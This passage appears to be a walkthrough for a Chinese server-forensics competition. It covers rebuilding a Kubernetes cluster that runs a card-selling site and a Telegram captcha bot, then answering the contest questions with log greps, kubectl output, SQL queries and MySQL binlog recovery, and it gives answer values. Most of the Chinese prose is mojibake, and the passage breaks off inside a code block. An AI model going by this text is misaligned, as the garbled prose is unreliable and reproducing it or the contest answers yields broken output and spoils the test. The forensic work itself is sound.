src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251111140802759.png" alt="image-20251111140802759"></p><p>è¿˜éœ€è¦å°†å››å°æœºå™¨çš„é˜²ç«å¢™éƒ½å…³æ‰ï¼Œç„¶åï¼Œæ•´ä¸ªé›†ç¾¤æ˜¯æœ‰ä¸¤ä¸ªä¸šåŠ¡çš„ï¼Œä¸€ä¸ªcaptcha-botï¼Œå’Œä¸€ä¸ªå‘å¡å¹³å°ï¼Œä¹Ÿå°±æ˜¯ç‹¬è§’æ•°å¡å‘å¡å¹³å°ï¼Œç”¨çš„æ˜¯php-nginxé•œåƒï¼Œåœ¨é›†ç¾¤31669æŒ‚ç€ã€‚è¿˜æœ‰ä¸€ä¸ªå°±æ˜¯captcha-botï¼Œä¸¤ä¸ªå…¬ç”¨ä¸€ä¸ªmysqlã€‚ç„¶åå°±æ˜¯ éœ€è¦å°†masterä¸­çš„php-nginx-deployment-nginx.taré•œåƒä¼ åˆ°node1å’Œnode2ï¼Œå› ä¸ºk8sé›†ç¾¤ä¸­ï¼Œæœ¬æœºyamlæ–‡ä»¶æŒ‡å®šè·‘åœ¨å“ªä¸ªnodeä¸­ï¼Œæ‰€ä»¥éƒ½è¦scpä¸€ä»½ï¼Œå¹¶ä¸”loadã€‚æŠŠdujiao*.yamléƒ½applyä¸€ä¸‹å³å¯å¯åŠ¨</p><p>è¯·æ ¹æ®æœåŠ¡å™¨æ£€æï¼Œå›ç­”ä»¥ä¸‹é—®é¢˜ï¼š<br>1ã€<br>node1èŠ‚ç‚¹çš„ç£ç›˜è®¾å¤‡SHA256å€¼å‰å…­ä½æ˜¯ï¼Ÿ(å­—æ¯å…¨å¤§å†™ï¼Œç­”æ¡ˆæ ¼å¼ï¼šAAAAAA)ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>å·²ä¿å­˜<br>2ã€<br>é›†ç¾¤é…ç½®äº†å¤šå°‘ä¸ªnodeèŠ‚ç‚¹ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š1ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251111140813233.png" alt="image-20251111140813233"><br>3ã€<br>å«Œç–‘äººäºä»€ä¹ˆæ—¶é—´ä¿®æ”¹masterèŠ‚ç‚¹çš„rootå¯†ç ï¼Ÿï¼ˆä½¿ç”¨åŒä½æ•°æ ¼å¼ï¼Œç­”æ¡ˆæ ¼å¼ï¼š00:00:00ï¼‰ï¼ˆ )<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>è¿™é‡Œhistoryå¯ä»¥çœ‹åˆ°å‘½ä»¤ ä½†æ˜¯çœ‹ä¸åˆ°æ—¶é—´ï¼Œæ‰€ä»¥éœ€è¦æŸ¥æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># å¯¹äº RHEL/CentOS ç³»ç»Ÿ</span><br><span class="line">grep &quot;passwd&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line"># å¯¹äº Ubuntu/Debian ç³»ç»Ÿ</span><br><span class="line">grep &quot;passwd&quot; /var/log/auth.log</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251111141834460.png" alt="image-20251111141834460"></p><p>å¯ä»¥çœ‹åˆ°æ”¹äº†å¯†ç ï¼Œ20251111æ˜¯å› ä¸ºä¼šæœ‰æ—¥å¿—å¤‡ä»½ï¼Œä¸€å…±ä¿©æ—¥æœŸéƒ½çœ‹çœ‹ã€‚</p><p>4ã€<br>Dockerçš„å®‰è£…æ—¥æœŸæ˜¯ï¼Ÿï¼ˆä½¿ç”¨åŒä½æ•°æ ¼å¼ï¼Œç­”æ¡ˆæ ¼å¼ï¼š01æœˆ01æ—¥ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>[root@master log]# rpm -qi docker-ce | grep â€œInstall Dateâ€<br>Install Date: 2025å¹´04æœˆ08æ—¥ æ˜ŸæœŸäºŒ 20æ—¶24åˆ†20ç§’<br>[root@master log]#</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251111142140518.png" alt="image-20251111142140518">5ã€<br>Dockeré€šè¿‡é…ç½®å®ˆæŠ¤è¿›ç¨‹ä»¥ä½¿ç”¨å…¨å±€ä»£ç†ï¼Œè¯¥ä»£ç†åœ°å€çš„ç«¯å£æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š1ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>ç½‘ä¸Šæ•™çš„åˆ›å»ºdockerä»£ç†çš„æ–‡ä»¶éƒ½åœ¨ï¼Œ/etc/systemd/system/docker.service.d/http-proxy.confï¼Œä½†æ˜¯æŸ¥çœ‹æœºå™¨æ²¡æœ‰è¿™æ–‡ä»¶ï¼Œäºæ˜¯çœ‹historyï¼Œ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251111142851092.png" alt="image-20251111142851092"></p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251111142902466.png" alt="image-20251111142902466">6ã€<br>å‘å¡ç½‘ç«™ä½¿ç”¨çš„Mysqlæ•°æ®åº“å¯¹å¤–è®¿é—®ç«¯å£æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š1ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251111145611180.png" alt="image-20251111145611180"></p><p>è¿™é‡Œå°±æ˜¯ mysqlçš„æ˜ å°„ç«¯å£ï¼Œ type: NodePortæ—¶k8så°†éšæœºåˆ†é…ä¸€ä¸ªç«¯å£ åœ¨ 30000åˆ°38000ä¹‹é—´ï¼Œkubectl get svc mysql -n default -o yaml</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251111145740015.png" alt="image-20251111145740015"></p><p>å°±å¯ä»¥çœ‹åˆ°æ˜ å°„ç«¯å£äº† ï¼Œkubectl get services -A<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251111145826213.png" alt="image-20251111145826213"></p><p>7ã€<br>å‘å¡ç½‘ç«™éƒ¨ç½²ä½¿ç”¨çš„é•œåƒåç§°æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šroot/rootï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251111153657681.png" alt="image-20251111152154163"></p><p>å¯ä»¥çœ‹åˆ°æ‰€æœ‰podä¸­ï¼Œè¿™ä¸ªpodæ¯”è¾ƒå¯ç–‘ï¼Œå¹¶ä¸”æŒ‚æ‰äº†ã€‚åœ¨defaultä¸­</p><p><code>kubectl describe pod captcha-bot-6b4d85b765-25xq6 -n default</code>å¯ä»¥æŸ¥çœ‹ç›¸å…³æ—¥å¿—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl describe pod captcha-bot-6b4d85b765-25xq6 -n default</span></span><br><span class="line">Name:             captcha-bot-6b4d85b765-25xq6</span><br><span class="line">Namespace:        default</span><br><span class="line">Priority:         0</span><br><span class="line">Service Account:  default</span><br><span class="line">Node:             node2/192.168.50.82</span><br><span class="line">Start Time:       Wed, 17 Sep 2025 22:48:21 +0800</span><br><span class="line">Labels:           app=captcha-bot</span><br><span class="line">                  pod-template-hash=6b4d85b765</span><br><span class="line">Annotations:      cni.projectcalico.org/containerID: 40716ec4ba113d25bf7c2890324d0b7634554681947b3599aedd59a08d30b1ab</span><br><span class="line">                  cni.projectcalico.org/podIP: 10.224.104.21/32</span><br><span class="line">                  cni.projectcalico.org/podIPs: 10.224.104.21/32</span><br><span class="line">Status:           Running</span><br><span class="line">IP:</span><br><span class="line">IPs:              &lt;none&gt;</span><br><span class="line">Controlled By:    ReplicaSet/captcha-bot-6b4d85b765</span><br><span class="line">Containers:</span><br><span class="line">  captcha-bot:</span><br><span class="line">    Container ID:  docker://8fadf590e1a8404ee09bb866f09547d699bbddd825b1a8dff5722aaef720994d</span><br><span class="line">    Image:         alpine:latest</span><br><span class="line">    Image ID:      docker://sha256:9234e8fb04c47cfe0f49931e4ac7eb76fa904e33b7f8576aec0501c085f02516</span><br><span class="line">    Port:          &lt;none&gt;</span><br><span class="line">    Host Port:     &lt;none&gt;</span><br><span class="line">    Command:</span><br><span class="line">      ./captcha-bot</span><br><span class="line">    State:          Terminated</span><br><span class="line">      Reason:       Error</span><br><span class="line">      Exit Code:    255</span><br><span class="line">      Started:      Thu, 18 Sep 2025 16:44:30 +0800</span><br><span class="line">      Finished:     Fri, 19 Sep 2025 09:34:09 +0800</span><br><span class="line">    Ready:          False</span><br><span class="line">    Restart Count:  2</span><br><span class="line">    Environment:    &lt;none&gt;</span><br><span class="line">    Mounts:</span><br><span class="line">      /app from captcha-bot-pv-storage (rw)</span><br><span class="line">      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-z278h (ro)</span><br><span class="line">Conditions:</span><br><span class="line">  Type              Status</span><br><span class="line">  Initialized       True</span><br><span class="line">  Ready             False</span><br><span class="line">  ContainersReady   False</span><br><span class="line">  PodScheduled      True</span><br><span class="line">Volumes:</span><br><span class="line">  captcha-bot-pv-storage:</span><br><span class="line">    Type:       PersistentVolumeClaim (a reference to a PersistentVolumeClaim <span class="keyword">in</span> the same namespace)</span><br><span class="line">    ClaimName:  captcha-bot</span><br><span class="line">    ReadOnly:   <span class="literal">false</span></span><br><span class="line">  kube-api-access-z278h:</span><br><span class="line">    Type:                    Projected (a volume that contains injected data from multiple sources)</span><br><span class="line">    TokenExpirationSeconds:  3607</span><br><span class="line">    ConfigMapName:           kube-root-ca.crt</span><br><span class="line">    ConfigMapOptional:       &lt;nil&gt;</span><br><span class="line">    DownwardAPI:             <span class="literal">true</span></span><br><span class="line">QoS Class:                   BestEffort</span><br><span class="line">Node-Selectors:              &lt;none&gt;</span><br><span class="line">Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists <span class="keyword">for</span> 300s</span><br><span class="line">                             node.kubernetes.io/unreachable:NoExecute op=Exists <span class="keyword">for</span> 300s</span><br><span class="line">Events:</span><br><span class="line">  Type     Reason       Age                   From     Message</span><br><span class="line">  ----     ------       ----                  ----     -------</span><br><span class="line">  Warning  FailedMount  2m18s (x20 over 66m)  kubelet  MountVolume.SetUp failed <span class="keyword">for</span> volume <span class="string">&quot;pvc-14ad3a73-9c46-4d85-88f6-6610dd06acf2&quot;</span> : mount failed: <span class="built_in">exit</span> status 32</span><br><span class="line">Mounting <span class="built_in">command</span>: mount</span><br><span class="line">Mounting arguments: -t nfs 192.168.50.83:/data/k8s_data/default/captchaBot /var/lib/kubelet/pods/2305463f-1ffb-45cd-ae2d-4997694ea3e9/volumes/kubernetes.io~nfs/pvc-14ad3a73-9c46-4d85-88f6-6610dd06acf2</span><br><span class="line">Output: mount.nfs: No route to host</span><br></pre></td></tr></table></figure><p>8ã€<br>å½“å‰Telegramç¾¤ç®¡æœºå™¨äººä½¿ç”¨çš„å®¹å™¨IDçš„å‰å…­ä½æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š123abcï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>æœªä¿å­˜<br>9ã€<br>å‘å¡ç½‘ç«™ä½¿ç”¨çš„ç¼“å­˜æ•°æ®åº“æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šmysqlï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ</p><p>æ•°æ®æœåŠ¡å™¨å››ç§æœ‰ï¼Œ/data/k8s_data/default/dujiaokaæœ‰ä¸€ä¸ª.envé‡Œé¢åŒ…å«äº†<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117111059396.png" alt="image-20251117111059396"><br>10ã€<br>é›†ç¾¤ä¸­é…ç½®çš„å‘å¡ç½‘ç«™ä»£ç è¿è¡Œæ‰€åœ¨çš„ç‰©ç†ç›®å½•æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š/root/rootï¼‰ï¼ˆ )<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>/data/k8s_data/ä¸Šé¢çš„ä¿¡æ¯æŠ¥é”™ä¸­ï¼Œå¯ä»¥çœ‹åˆ°data/k8s_data/default/captchaBot ï¼Œæˆ‘ä»¬çœ‹åˆ°ç›¸å…³æ–‡ä»¶åœ¨ï¼Œ/data/k8s_data/default/dujiaoka</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117111350413.png" alt="image-20251117111350413">11ã€<br>Telegramç¾¤ç®¡æœºå™¨äººé…ç½®çš„APIä»£ç†åŸŸåæ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š<a href="http://www.xxx.com)(/">www.xxx.comï¼‰ï¼ˆ</a> ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆç›¸å…³ç›®å½•ä¸‹å¯ä»¥æŸ¥çœ‹åˆ°<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117111507954.png" alt="image-20251117111507954"><br>12ã€<br>å«Œç–‘äººåœ¨Telegramä¸Šåˆ›å»ºçš„ç¾¤åç§°æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šæ¯”æ­¦ç¾¤ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆè®¿é—®å³å¯<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251111182644686.png" alt="image-20251111182644686"><br>13ã€<br>ç»Ÿè®¡å«Œç–‘äººåœ¨Telegramä¸Šåˆ›å»ºçš„ç¾¤ä¸­2025å¹´6æœˆä¹‹åæˆåŠŸå…¥ç¾¤çš„äººæ•°ä¸ºï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š1ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆï¼ŒSELECT COUNT(*) AS join_count<br>FROM user_captcha_record<br>WHERE telegram_chat_name = â€˜è¥¿é—¨åº†äº¤æµç¾¤â€™<br>  AND captcha_status = 1<br>  AND captcha_success_time &gt;= â€˜2025-06-01 00:00:00â€™;<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117113123384.png" alt="image-20251117113123384"></p><p>14ã€<br>æ®å«Œç–‘äººäº¤ä»£æ›¾åœ¨å‘å¡ç½‘ä¸Šåˆ é™¤è¿‡ä¸€æ¡è®¢å•æ•°æ®ï¼Œè¯·æ‰¾å‡ºè¯¥åˆ é™¤è®¢å•çš„è®¢å•å·æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šè¯·æŒ‰å®é™…å€¼å¡«å†™ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>è¿™ä¸€æ­¥éœ€è¦åœ¨æ²¡æœ‰æ­å»ºå¥½k8sé›†ç¾¤æ—¶ï¼Œå°±è¦çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœä½ å·²ç»åˆ›å»ºå¥½äº†é›†ç¾¤ï¼Œå‘ç°dataç›®å½•ä¸‹æ—¶03å’Œ04æ–‡ä»¶ï¼Œé‚£æˆ‘å»ºè®®ä½ åˆ é™¤æŒ‚èµ·çš„æ–‡ä»¶ï¼Œä»æ–°æŒ‚èµ·å°±èƒ½çœ‹åˆ°é»˜è®¤çš„æ–‡ä»¶ï¼Œ</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117144946123.png" alt="image-20251117144946123"></p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117145611432.png" alt="image-20251117145611432"></p><p>ä¹Ÿå°±æ˜¯01 å’Œ02æ–‡ä»¶ï¼Œ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117145644469.png" alt="image-20251117145644469"></p><p>æˆ‘ä»¬é€šè¿‡è¿æ¥æ•°æ®åº“å¾—çŸ¥ï¼Œè¿™é‡Œæ˜¯8.0.43çš„mysqlï¼Œæ‰€ä»¥è§£æ–‡ä»¶çš„æ—¶å€™éœ€è¦8.0.43çš„mysqlbinlog,<code>https://downloads.mysql.com/archives/community/</code>,æ­¤å¤„ç›´æ¥ä¸‹è½½å³å¯ï¼Œ<code>.\mysqlbinlog.exe --no-defaults -vv --base64-output=DECODE-ROWS .\binlog.000002 &gt;b.sql</code><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117145822903.png" alt="image-20251117145822903">ä¸€ä¸ªä¸€ä¸ªæ¢å¤mysqlæ–‡ä»¶ï¼Œ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117145906743.png" alt="image-20251117145906743"></p><p>åœ¨20:58:54ï¼Œæœ‰ä¸€æ¡ä¸”ä»…æœ‰ä¸€æ¡åˆ é™¤è®°å½•ï¼Œç­”æ¡ˆä¸ºï¼Œ4V8XNK8Q02MD5D2R</p><p>15ã€<br>å‘å¡ç½‘ç«™ä¸Š2025å¹´6æœˆä¹‹åè®¢å•äº¤æ˜“æˆåŠŸçš„æ€»é‡‘é¢æ˜¯ï¼Ÿå¿½ç•¥è¢«åˆ é™¤çš„æ•°æ®ï¼ˆç­”æ¡ˆæ ¼å¼ï¼š1ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆï¼Œgptä¸€ä¸‹<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117144308389.png" alt="image-20251117144308389"><br>16ã€<br>å‘å¡ç½‘ç«™çš„åå°è®¿é—®è·¯å¾„æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š/rootï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆï¼Œå¯ä»¥çœ‹åˆ°ä¸º/admin<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117111059396.png" alt="image-20251117111059396"><br>17ã€<br>è®¡ç®—å‡ºç”¨æˆ·å¯†ç ç®—æ³•ä¸­Saltçš„å€¼ï¼Œå¹¶è¿›è¡ŒBase64ç¼–ç ï¼Œç»“æœæ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šè¯·æŒ‰å®é™…å€¼å¡«å†™ï¼‰ï¼ˆ )<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>find ./ -type f -mtime -150  é€’å½’äº”ä¸ªæœˆå†…ä¿®æ”¹è¿‡çš„æ–‡ä»¶ ,å°†é‡Œé¢çš„getsaltæŠ å‡ºæ¥è¿è¡Œå³å¯ã€‚</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117152921332.png" alt="image-20251117152921332"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 